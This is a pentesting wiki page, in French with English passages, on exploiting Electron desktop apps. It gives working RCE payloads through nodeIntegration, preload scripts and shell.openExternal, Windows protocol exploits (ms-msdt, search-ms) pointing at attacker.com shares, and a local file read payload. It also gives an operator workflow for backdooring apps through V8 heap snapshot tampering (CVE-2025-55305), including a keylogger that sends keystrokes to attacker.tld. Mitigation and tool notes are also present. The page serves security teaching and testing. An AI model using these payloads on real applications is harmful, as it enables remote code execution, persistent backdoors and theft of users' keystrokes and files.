# Applications de bureau Electron

{{#include ../../../banners/hacktricks-training.md}}

## Introduction

Electron combine un backend local (avec **NodeJS**) et un frontend (**Chromium**), bien qu'il lui manque certains mécanismes de sécurité des navigateurs modernes.

Généralement, vous pouvez trouver le code de l'application Electron à l'intérieur d'une application `.asar`. Pour obtenir le code, vous devez l'extraire :
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
Dans le code source d'une application Electron, dans `packet.json`, vous pouvez trouver le fichier `main.js` où sont définies les configurations de sécurité.
```json
{
"name": "standard-notes",
"main": "./app/index.js",
```
Electron possède 2 types de processus :

- Main Process (dispose d'un accès complet à NodeJS)
- Renderer Process (devrait avoir un accès restreint à NodeJS pour des raisons de sécurité)

![](<../../../images/image (182).png>)

Un **renderer process** sera une fenêtre de navigateur chargeant un fichier :
```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```
Les paramètres du **processus de rendu** peuvent être **configurés** dans le **processus principal** du fichier main.js. Certaines configurations empêcheront l'application Electron d'obtenir une RCE ou d'autres vulnérabilités si les **paramètres sont correctement configurés**.

L'application Electron **pourrait accéder à l'appareil** via les API Node bien qu'elle puisse être configurée pour l'en empêcher :

- **`nodeIntegration`** - est `off` par défaut. Si activé, permet d'accéder aux fonctionnalités de Node depuis le processus de rendu.
- **`contextIsolation`** - est `on` par défaut. Si `off`, les processus principal et de rendu ne sont pas isolés.
- **`preload`** - vide par défaut.
- [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - est `off` par défaut. Il restreindra les actions que NodeJS peut effectuer.
- Intégration Node dans les Workers
- **`nodeIntegrationInSubframes`**- est `off` par défaut.
- Si **`nodeIntegration`** est **enabled**, cela permettrait l'utilisation des **Node.js APIs** dans les pages web **chargées dans des iframes** au sein d'une application Electron.
- Si **`nodeIntegration`** est **disabled**, alors les preloads seront chargés dans l'iframe

Exemple de configuration:
```javascript
const mainWindowOptions = {
title: "Discord",
backgroundColor: getBackgroundColor(),
width: DEFAULT_WIDTH,
height: DEFAULT_HEIGHT,
minWidth: MIN_WIDTH,
minHeight: MIN_HEIGHT,
transparent: false,
frame: false,
resizable: true,
show: isVisible,
webPreferences: {
blinkFeatures: "EnumerateDevices,AudioOutputDevices",
nodeIntegration: false,
contextIsolation: false,
sandbox: false,
nodeIntegrationInSubFrames: false,
preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
nativeWindowOpen: true,
enableRemoteModule: false,
spellcheck: true,
},
}
```
Quelques **RCE payloads** depuis [here](https://7as.es/electron/nodeIntegration_rce.txt):
```html
Example Payloads (Windows):
<img
src="x"
onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
src="x"
onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('id').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
src="x"
onerror="alert(require('child_process').execSync('uname -a').toString());" />
```
### Capturer le trafic

Modifiez la configuration start-main et ajoutez l'utilisation d'un proxy tel que :
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## Electron Local Code Injection

Si vous pouvez exécuter localement une Electron App, il est possible de la faire exécuter du code javascript arbitraire. Voyez comment dans :


{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

## RCE: XSS + nodeIntegration

Si la **nodeIntegration** est réglée sur **on**, le JavaScript d'une page web peut utiliser les fonctionnalités de Node.js facilement simplement en appelant `require()`. Par exemple, la façon d'exécuter l'application calc sur Windows est :
```html
<script>
require("child_process").exec("calc")
// or
top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```
<figure><img src="../../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Le script indiqué dans ce réglage est **chargé avant les autres scripts dans le renderer**, il a donc **un accès illimité aux Node APIs** :
```javascript
new BrowserWindow{
webPreferences: {
nodeIntegration: false,
preload: _path2.default.join(__dirname, 'perload.js'),
}
});
```
Par conséquent, le script peut exporter node-features vers des pages :
```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
require("child_process").exec("calc")
}
```

```html:index.html
<body>
<script>
typeof require === "undefined"
runCalc()
</script>
</body>
```
> [!NOTE] > **Si `contextIsolation` est activé, cela ne fonctionnera pas**

## RCE: XSS + contextIsolation

Le _**contextIsolation**_ introduit les **contextes séparés entre les scripts de la page web et le code interne JavaScript d'Electron** afin que l'exécution JavaScript de chaque code n'affecte pas l'autre. C'est une fonctionnalité nécessaire pour éliminer la possibilité de RCE.

Si les contextes ne sont pas isolés, un attaquant peut :

1. Exécuter **du JavaScript arbitraire dans le renderer** (XSS ou navigation vers des sites externes)
2. **Écraser la méthode intégrée** utilisée dans le preload ou le code interne d'Electron pour prendre le contrôle
3. **Déclencher** l'utilisation de la **fonction écrasée**
4. RCE?

There are 2 places where built-int methods can be overwritten: In preload code or in Electron internal code:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Bypass click event

S'il y a des restrictions appliquées lorsque vous cliquez sur un lien, vous pourrez peut-être les contourner **en effectuant un clic du milieu** au lieu d'un clic gauche classique
```javascript
window.addEventListener('click', (e) => {
```
## RCE via shell.openExternal

Pour plus d'informations sur ces exemples, consultez [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) et [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

Lors du déploiement d'une application desktop Electron, s'assurer des bons paramètres pour `nodeIntegration` et `contextIsolation` est crucial. Il est établi que **client-side remote code execution (RCE)** ciblant les preload scripts ou le native code d'Electron depuis le main process est efficacement empêché lorsque ces paramètres sont en place.

Lorsque l'utilisateur interagit avec des liens ou ouvre de nouvelles fenêtres, des event listeners spécifiques sont déclenchés, qui sont cruciaux pour la sécurité et le fonctionnement de l'application :
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
Ces gestionnaires d'événements sont **surchargés par l'application de bureau** pour implémenter sa propre **logique métier**. L'application évalue si un lien navigué doit être ouvert en interne ou dans un navigateur web externe. Cette décision est généralement prise via une fonction, `openInternally`. Si cette fonction retourne `false`, cela indique que le lien doit être ouvert en externe, en utilisant la fonction `shell.openExternal`.

**Here is a simplified pseudocode:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../../images/image (963).png>)

Les bonnes pratiques de sécurité Electron JS déconseillent d'accepter du contenu non fiable avec la fonction `openExternal`, car cela pourrait mener à du RCE via différents protocoles. Les systèmes d'exploitation prennent en charge divers protocoles susceptibles de déclencher du RCE. Pour des exemples détaillés et des explications supplémentaires sur ce sujet, on peut se référer à [this resource](https://positive.security/blog/url-open-rce#windows-10-19042), qui inclut des exemples de protocoles Windows capables d'exploiter cette vulnérabilité.

Dans macos, la fonction `openExternal` peut être exploitée pour exécuter des commandes arbitraires comme dans `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Exemples d'exploits de protocoles Windows incluent :**
```html
<script>
window.open(
"ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
)
</script>

<script>
window.open(
"search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
)
</script>

<script>
window.open(
"ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
)
</script>
```
## RCE: webviewTag + vulnerable preload IPC + shell.openExternal

Cette vulnérabilité est décrite dans **[this report](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.

La **webviewTag** est une **fonctionnalité dépréciée** qui permet l'utilisation de **NodeJS** dans le **renderer process**, qui devrait être désactivée car elle permet de charger un script dans le preload context comme:
```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```
Ainsi, un attaquant qui parvient à charger une page arbitraire pourrait utiliser cette balise pour **charger un script de préchargement arbitraire**.

Ce script de préchargement a ensuite été abusé pour appeler un **service IPC vulnérable (`skype-new-window`)** qui appelait **`shell.openExternal`** pour obtenir une RCE:
```javascript
(async() => {
const { ipcRenderer } = require("electron");
await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
setTimeout(async () => {
const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
}, 5000);
})();
```
## Lecture de fichiers internes : XSS + contextIsolation

**La désactivation de `contextIsolation` permet d'utiliser des balises `<webview>`**, similaires à `<iframe>`, pour lire et exfiltrer des fichiers locaux. Un exemple montre comment exploiter cette vulnérabilité pour lire le contenu de fichiers internes :

![](<../../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

De plus, une autre méthode pour **lire un fichier interne** est présentée, mettant en évidence une vulnérabilité critique de lecture de fichiers locaux dans une Electron desktop app. Cela implique d'injecter un script pour exploiter l'application et exfiltrer des données :
```html
<br /><br /><br /><br />
<h1>
pwn<br />
<iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
function j() {
alert(
"pwned contents of /etc/hosts :\n\n " +
frames[0].document.body.innerText
)
}
</script>
</h1>
```
## **RCE : XSS + Chromium ancien**

Si le **chromium** utilisé par l'application est **ancien** et qu'il existe des **vulnérabilités** **connues** le concernant, il pourrait être possible de **l'exploiter et obtenir RCE via un XSS**.\
Vous pouvez voir un exemple dans ce **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing via Internal URL regex bypass**

Supposons que vous ayez trouvé une XSS mais que vous **ne puissiez pas déclencher RCE ni voler des fichiers internes**, vous pouvez essayer de l'utiliser pour **voler des identifiants via phishing**.

Tout d'abord, vous devez savoir ce qui se passe lorsque vous essayez d'ouvrir une nouvelle URL, en vérifiant le code JS du front-end :
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
L'appel à **`openInternally`** décidera si le **link** sera **ouvert** dans la **desktop window** car il s'agit d'un lien appartenant à la plateforme, **ou** s'il sera ouvert dans le **browser as a 3rd party resource**.

Dans le cas où le **regex** utilisé par la fonction est **vulnérable aux contournements** (par exemple en **n'échappant pas les points des sous-domaines**) un attaquant pourrait abuser du XSS pour **ouvrir une nouvelle fenêtre qui** sera située dans l'infrastructure de l'attaquant **demandant des identifiants** à l'utilisateur :
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## `file://` Protocole

As mentioned in [the docs](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols) pages running on **`file://`** have unilateral access to every file on your machine meaning that **XSS issues can be used to load arbitrary files** from the users machine. Using a **protocole personnalisé** prevents issues like this as you can limit the protocol to only serving a specific set of files.

## Remote module

The Electron Remote module allows **renderer processes to access main process APIs**, facilitating communication within an Electron application. However, enabling this module introduces significant security risks. It expands the application's attack surface, making it more susceptible to vulnerabilities such as cross-site scripting (XSS) attacks.

> [!TIP]
> Bien que le module **remote** expose certaines APIs du main vers les renderer processes, il n'est pas simple d'obtenir une RCE simplement en abusant des composants. Cependant, les composants peuvent exposer des informations sensibles.

> [!WARNING]
> Beaucoup d'apps qui utilisent encore le remote module le font d'une façon qui **exige que NodeIntegration soit activé** dans le renderer process, ce qui représente un **énorme risque de sécurité**.

Since Electron 14 the `remote` module of Electron might be enabled in several steops cause due to security and performance reasons it's **recommended to not use it**.

To enable it, it'd first needed to **enable it in the main process**:
```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
mainWindow = new BrowserWindow({
[...]
})
remoteMain.enable(mainWindow.webContents)
```
Ensuite, le renderer process peut importer des objets depuis le module qu'il souhaite :
```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```
La **[blog post](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** indique quelques **fonctions** intéressantes exposées par l'objet **`app`** du module remote :

- **`app.relaunch([options])`**
- **Redémarre** l'application en **quittant** l'instance courante et en **lançant** une nouvelle. Utile pour les **mises à jour de l'application** ou des **changements d'état** significatifs.
- **`app.setAppLogsPath([path])`**
- **Définit** ou **crée** un répertoire pour stocker les **journaux de l'application**. Les journaux peuvent être **récupérés** ou **modifiés** en utilisant **`app.getPath()`** ou **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**
- **Enregistre** l'exécutable courant comme **gestionnaire par défaut** pour un **protocole** spécifié. Vous pouvez fournir un **chemin personnalisé** et des **arguments** si nécessaire.
- **`app.setUserTasks(tasks)`**
- **Ajoute** des tâches à la **Tasks category** dans la **Jump List** (sur Windows). Chaque tâche peut contrôler comment l'application est **lancée** ou quels **arguments** sont passés.
- **`app.importCertificate(options, callback)`**
- **Importe** un **PKCS#12 certificate** dans le **certificate store** du système (Linux uniquement). Un **callback** peut être utilisé pour gérer le résultat.
- **`app.moveToApplicationsFolder([options])`**
- **Déplace** l'application vers le **Applications folder** (sur macOS). Aide à garantir une **installation standard** pour les utilisateurs Mac.
- **`app.setJumpList(categories)`**
- **Définit** ou **supprime** une **Jump List** personnalisée sur **Windows**. Vous pouvez spécifier des **catégories** pour organiser l'apparence des tâches pour l'utilisateur.
- **`app.setLoginItemSettings(settings)`**
- **Configure** quels **exécutables** se lancent à la **connexion** ainsi que leurs **options** (macOS et Windows uniquement).

Exemple:
```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```
## systemPreferences module

L'**API principale** pour accéder aux préférences système et **émettre des événements système** dans Electron. Des méthodes comme **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault**, et **setUserDefault** sont toutes **parties de** ce module.

**Exemple d'utilisation :**
```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```
### **subscribeNotification / subscribeWorkspaceNotification**

* **Écoute** les **notifications macOS natives** en utilisant NSDistributedNotificationCenter.
* Avant **macOS Catalina**, vous pouviez sniff **toutes** les distributed notifications en passant **nil** à CFNotificationCenterAddObserver.
* Après **Catalina / Big Sur**, les apps **sandboxed** peuvent toujours **s'abonner** à **nombreux événements** (par exemple, **verrouillage/déverrouillage d'écran**, **montages de volumes**, **activité réseau**, etc.) en enregistrant des notifications **par nom**.

### **getUserDefault / setUserDefault**

* **S'interface** avec **NSUserDefaults**, qui stocke les préférences **application** ou **globales** sur macOS.

* **getUserDefault** peut **récupérer** des informations sensibles, telles que les **emplacements de fichiers récents** ou la **localisation géographique** de l'utilisateur.

* **setUserDefault** peut **modifier** ces préférences, affectant potentiellement la **configuration** d'une app.

* Dans les **anciennes versions d'Electron** (avant v8.3.0), seule la **suite standard** de NSUserDefaults était **accessible**.

## Shell.showItemInFolder

This function shows the given file in a file manager, which **could automatically execute the file**.

For more information check [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

## Content Security Policy

Les apps Electron devraient avoir une **Content Security Policy (CSP)** pour **prévenir les attaques XSS**. La **CSP** est une **norme de sécurité** qui aide à **empêcher** l'**exécution** de **code non fiable** dans le navigateur.

Elle est généralement **configurée** dans le fichier **`main.js`** ou dans le template **`index.html`** avec la CSP dans une **balise meta**.

For more information check:


{{#ref}}
pentesting-web/content-security-policy-csp-bypass/
{{#endref}}


## **Tools**

- [**Electronegativity**](https://github.com/doyensec/electronegativity) est un outil pour identifier les mauvaises configurations et les anti-patterns de sécurité dans les applications basées sur Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) est un plugin VS Code open source pour les applications Electron qui utilise Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) pour vérifier les bibliothèques tierces vulnérables
- [**Electro.ng**](https://electro.ng/): il faut l'acheter

## Labs

In [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) you can find a lab to exploit vulnerable Electron apps.

Quelques commandes qui vous aideront avec le lab:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## Local backdooring via V8 heap snapshot tampering (Electron/Chromium) – CVE-2025-55305

Electron and Chromium-based apps deserialize a prebuilt V8 heap snapshot at startup (v8_context_snapshot.bin, and optionally browser_v8_context_snapshot.bin) to initialize each V8 isolate (main, preload, renderer). Historically, Electron’s integrity fuses did not treat these snapshots as executable content, so they escaped both fuse-based integrity enforcement and OS code-signing checks. As a result, replacing the snapshot in a user-writable installation provided stealthy, persistent code execution inside the app without modifying the signed binaries or ASAR.

Points clés
- Integrity gap: EnableEmbeddedAsarIntegrityValidation and OnlyLoadAppFromAsar valident le JavaScript de l'app à l'intérieur de l'ASAR, mais ne couvraient pas les V8 heap snapshots (CVE-2025-55305). Chromium ne vérifie pas non plus l'intégrité des snapshots.
- Attack preconditions: écriture locale de fichiers dans le répertoire d'installation de l'app. Cela est courant sur les systèmes où les apps Electron ou navigateurs Chromium sont installés dans des chemins modifiables par l'utilisateur (p.ex. %AppData%\Local sous Windows ; /Applications avec des réserves sur macOS).
- Effect: exécution fiable du payload JavaScript de l'attaquant dans n'importe quel isolate en écrasant un builtin fréquemment utilisé (un « gadget »), permettant persistance et contournement de la vérification de signature de code.
- Affected surface: apps Electron (même avec les fuses activés) et navigateurs basés sur Chromium qui chargent des snapshots depuis des emplacements modifiables par l'utilisateur.

Generating a malicious snapshot without building Chromium
- Use the prebuilt electron/mksnapshot to compile a payload JS into a snapshot and overwrite the application’s v8_context_snapshot.bin.

Example minimal payload (prove execution by forcing a crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
// Executed whenever the app calls Array.isArray
throw new Error("testing isArray gadget");
};
```
Isolate-aware payload routing (run different code in main vs. renderer)
- Détection du processus principal: Les globaux spécifiques à Node comme process.pid, process.binding(), ou process.dlopen sont présents dans l'isolate du processus principal.
- Détection navigateur/renderer: Les globaux spécifiques au navigateur comme alert sont disponibles lorsqu'on s'exécute dans un contexte de document.

Exemple de gadget qui sonde une fois les capacités Node du processus principal
```js
const orig = Array.isArray;

Array.isArray = function() {
// Defer until we land in main (has Node process)
try {
if (!process || !process.pid) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

// Run once
if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
console.log('[payload] isArray hook started ...');

// Capability probing in main
console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
process.exit(0);
}
return orig(...arguments);
};
```
PoC de vol de données du renderer/contexte du navigateur (p. ex., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
// Wait for a browser context
try {
if (!alert) {
return orig(...arguments);
}
} catch (_) {
return orig(...arguments);
}

if (!globalThis._invoke_lock) {
globalThis._invoke_lock = true;
setInterval(() => {
window.onkeydown = (e) => {
fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
}
}, 1000);
}
return orig(...arguments);
};
```
Operator workflow
1) Write payload.js that clobbers a common builtin (e.g., Array.isArray) and optionally branches per isolate.
2) Build the snapshot without Chromium sources:
- npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Overwrite the target application’s snapshot file(s):
- v8_context_snapshot.bin (always used)
- browser_v8_context_snapshot.bin (if the LoadBrowserProcessSpecificV8Snapshot fuse is used)
4) Launch the application; the gadget executes whenever the chosen builtin is used.

Notes and considerations
- Integrity/signature bypass: Snapshot files are not treated as native executables by code-signing checks and (historically) were not covered by Electron’s fuses or Chromium integrity controls.
- Persistence: Replacing the snapshot in a user-writable install typically survives app restarts and looks like a signed, legitimate app.
- Chromium browsers: The same tampering concept applies to Chrome/derivatives installed in user-writable locations. Chrome has other integrity mitigations but explicitly excludes physically local attacks from its threat model.

Detection and mitigations
- Treat snapshots as executable content and include them in integrity enforcement (CVE-2025-55305 fix).
- Prefer admin-writable-only install locations; baseline and monitor hashes for v8_context_snapshot.bin and browser_v8_context_snapshot.bin.
- Detect early-runtime builtin clobbering and unexpected snapshot changes; alert when deserialized snapshots do not match expected values.

## **References**

- [Trail of Bits: Subverting code integrity checks to locally backdoor Signal, 1Password, Slack, and more](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [Electron fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [Electron ASAR integrity](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [V8 custom startup snapshots](https://v8.dev/blog/custom-startup-snapshots)
- [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [Loki C2](https://github.com/boku7/Loki/)
- [Chromium: Disable loading of unsigned code (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [Chrome security FAQ: physically local attacks out of scope](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically-local-attacks-in-chromes-threat-model)

- [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
- [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- More researches and write-ups about Electron security in [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
- [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq&index=81)
- [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)

{{#include ../../../banners/hacktricks-training.md}}
